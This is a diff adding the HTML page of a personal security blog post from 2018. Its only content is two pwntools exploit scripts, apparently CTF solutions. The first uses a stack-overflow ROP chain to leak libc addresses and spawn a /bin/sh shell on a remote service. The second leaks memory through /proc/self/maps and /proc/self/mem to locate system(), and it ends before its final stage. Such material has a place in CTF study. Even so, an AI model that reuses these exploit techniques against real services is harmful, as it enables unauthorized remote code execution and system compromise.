@@ -1,0 +1,168 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8" />
+  
+  <title>文件读写内存实例 | Another&#39;s blog</title>
+  <meta name="author" content="another" />
+
+  
+  <meta name="description" content="1234567891011121314151617181920212223242526272829303132# level 3for i in range(14):attack()change_host()for i in range(3):if LOCAL:io2 = process(&#39;./pl" />
+  
+
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+
+  <meta property="og:title" content="文件读写内存实例" />
+  <meta property="og:site_name" content="Another&#39;s blog" />
+
+  
+  
+
+  
+    <meta property="og:image" content="" />
+  
+
+  
+  <link href="/css/images/favicon.ico" rel="icon" />
+  
+
+  <link rel="alternate" href="/atom.xml" title="Another&#39;s blog" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  
+
+
+  <!-- baidu webmaster push -->
+  <script src='//push.zhanzhang.baidu.com/push.js'></script>
+
+</head>
+
+
+<body>
+  <header id="header" class="inner"><div class="alignleft">
+  <h1><a href="/">Another&#39;s blog</a></h1>
+  <h2><a href="/"></a></h2>
+</div>
+<nav id="main-nav" class="alignright">
+  <ul>
+    
+      <li><a href="/">Home</a></li>
+    
+      <li><a href="/archives">Archives</a></li>
+    
+  </ul>
+  <div class="clearfix"></div>
+</nav>
+<div class="clearfix"></div></header>
+  <div id="content" class="inner">
+    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2018-07-07T07:58:18.000Z"><a href="/2018/07/07/文件读写内存实例/">2018-07-07</a></time>
+      
+      
+  
+    <h1 class="title">文件读写内存实例</h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># level 3</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">14</span>):</span><br><span class="line">attack()</span><br><span class="line">change_host()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line">io2 = process(<span class="string">'./play'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io2 = remote(<span class="string">'47.104.90.157'</span>, <span class="number">30003</span>)</span><br><span class="line">name = <span class="string">'B1rd'</span></span><br><span class="line">io2.recvuntil(<span class="string">'login:'</span>)</span><br><span class="line">io2.sendline(name)</span><br><span class="line">io2.recvuntil(<span class="string">'choice&gt;&gt; '</span>)</span><br><span class="line">io2.close()</span><br><span class="line">hacking(<span class="number">1</span>)</span><br><span class="line">attack2()</span><br><span class="line">io.recvuntil(<span class="string">'what\'s your name:'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./play'</span>)</span><br><span class="line">io.sendline(<span class="string">'A'</span> * <span class="number">0x4c</span> + p32(elf.plt[<span class="string">'write'</span>]) + p32(<span class="number">0x80492C0</span>) + p32(<span class="number">1</span>) +</span><br><span class="line">p32(elf.got[<span class="string">'read'</span>]) + p32(<span class="number">4</span>))</span><br><span class="line">io.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">libc_addr = u32(io.recvn(<span class="number">4</span>)) - libc.symbols[<span class="string">'read'</span>]</span><br><span class="line">log.info(<span class="string">'libc_addr:%#x'</span> % libc_addr)</span><br><span class="line">system_addr = libc_addr + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">bin_sh = libc_addr + next(libc.search(<span class="string">'/bin/sh'</span>))</span><br><span class="line">log.info(<span class="string">'system_addr:%#x'</span> % system_addr)</span><br><span class="line">log.info(<span class="string">'bin_sh:%#x'</span> % bin_sh)</span><br><span class="line">attack2()</span><br><span class="line">io.recvuntil(<span class="string">'what\'s your name:'</span>)</span><br><span class="line">io.sendline(<span class="string">'A'</span> * <span class="number">0x4c</span> + p32(system_addr) + p32(<span class="number">0</span>) + p32(bin_sh))</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">LOCAL = <span class="number">0</span></span><br><span class="line">DEBUG = <span class="number">1</span></span><br><span class="line">VERBOSE = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> VERBOSE:</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line">io = process(<span class="string">'./fileManager'</span>, aslr=<span class="keyword">False</span>, env=&#123;<span class="string">'LD_PRELOAD'</span>:</span><br><span class="line"><span class="string">'./libc.so.6'</span>&#125;)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">gdb.attach(io, <span class="string">'b *0x56555F2C\n'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io = remote(<span class="string">'47.104.188.138'</span>, <span class="number">30007</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_mod</span><span class="params">(name, offset, size)</span>:</span></span><br><span class="line">io.recvuntil(<span class="string">'\x87\xba\n'</span>)</span><br><span class="line">io.sendline(<span class="string">'1'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'\xa7\xb0\x3a'</span>)</span><br><span class="line">io.sendline(name)</span><br><span class="line">io.recvuntil(<span class="string">'\x87\x8f\x3a'</span>)</span><br><span class="line">io.sendline(str(offset))</span><br><span class="line">io.recvuntil(<span class="string">'\xb0\x8f\x3a'</span>)</span><br><span class="line">io.sendline(str(size))</span><br><span class="line">io.recvuntil(<span class="string">'\xae\xb9'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_mod</span><span class="params">(name, offset, size, content)</span>:</span></span><br><span class="line">io.recvuntil(<span class="string">'\x87\xba\n'</span>)</span><br><span class="line">io.sendline(<span class="string">'2'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'\xa7\xb0\x3a'</span>)</span><br><span class="line">io.sendline(name)</span><br><span class="line">io.recvuntil(<span class="string">'\x87\x8f\x3a'</span>)</span><br><span class="line">io.sendline(str(offset))</span><br><span class="line">io.recvuntil(<span class="string">'\xb0\x8f\x3a'</span>)</span><br><span class="line">io.sendline(str(size))</span><br><span class="line">io.recvuntil(<span class="string">'\x9d\x97\x3a'</span>)</span><br><span class="line">io.send(content)</span><br><span class="line">name = <span class="string">'B1rd'</span></span><br><span class="line">io.recvuntil(<span class="string">'FTP:'</span>)</span><br><span class="line">io.sendline(name)</span><br><span class="line">read_mod(<span class="string">'/proc/self/maps'</span>, <span class="number">0</span>, <span class="number">0x100</span>)</span><br><span class="line">elf_base = int(io.recvn(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">'elf_base:%#x'</span> % elf_base)</span><br><span class="line">elf = ELF(<span class="string">'fileManager'</span>)</span><br><span class="line">read_mod(<span class="string">'/proc/self/mem'</span>, elf_base + elf.got[<span class="string">'open'</span>], <span class="number">0x100</span>)</span><br><span class="line">libc_addr = u32(io.recvn(<span class="number">4</span>)) - libc.symbols[<span class="string">'open'</span>]</span><br><span class="line">system_addr = libc_addr + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">log.info(<span class="string">'libc_addr:%#x'</span> % libc_addr)</span><br><span class="line">log.info(<span class="string">'system_addr:%#x'</span> % system_addr)</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    <footer>
+        <div class="alignright">
+          
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
+        </div>
+        
+        
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+</div></div>
+    <aside id="sidebar" class="alignright">
+  <div class="search">
+  <form action="//google.com/search" method="get" accept-charset="utf-8">
+    <input type="search" name="q" results="0" placeholder="Search">
+    <input type="hidden" name="q" value="site:yoursite.com">
+  </form>
+</div>
+
+  
+
+  
+<div class="widget tag">
+  <h3 class="title">Recent Posts</h3>
+  <ul class="entry">
+    
+      <li>
+        <a href="/2018/07/07/sulb/">slub</a>
+      </li>
+    
+      <li>
+        <a href="/2018/07/07/afl/">afl</a>
+      </li>
+    
+      <li>
+        <a href="/2018/07/07/glibc malloc和free/">glibc malloc和free</a>
+      </li>
+    
+      <li>
+        <a href="/2018/07/07/brop/">brop</a>
+      </li>
+    
+      <li>
+        <a href="/2018/07/07/hexo/">搭建博客</a>
+      </li>
+    
+  </ul>
+</div>
+
+
+  
+
+  
+</aside>
+    <div class="clearfix"></div>
+  </div>
+  <footer id="footer" class="inner"><div class="alignleft">
+  <p>
+  
+  &copy; 2018 another
+  
+  All rights reserved.</p>
+  <p>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></p>
+</div>
+<div class="clearfix"></div>
+
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"1","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script></footer>
+  <script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+<div id='bg'></div>
+</body>
+</html>
